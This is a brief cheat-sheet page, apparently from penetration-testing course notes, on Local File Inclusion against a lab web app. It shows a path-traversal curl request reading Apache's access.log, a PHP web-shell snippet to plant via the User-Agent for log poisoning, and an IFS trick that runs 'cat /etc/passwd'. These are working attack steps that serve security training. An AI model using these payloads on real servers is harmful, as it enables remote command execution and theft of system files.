# Local File Inclusion (LFI)

Log entry of Apache's access.log
>``` shell
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
>
># ========== Expected Result ==========
>...
>192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
>...
># =====================================
>```

Unmodified Request in Burp Repeater
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Local-File-Inclusion-(LFI)-8.png)

PHP Snippet to embed in the User Agent
>``` shell
><?php echo system($_GET['cmd']); ?>
>```

Relative Path for the "page" parameter
>``` shell
>../../../../../../../../../var/log/apache2/access.log
>```

IFS Example
>``` shell
>IFS=' '  # Set IFS to space
>input="cat /etc/passwd"
>
>read -r cmd arg <<< "$input"
>$cmd $arg
>```

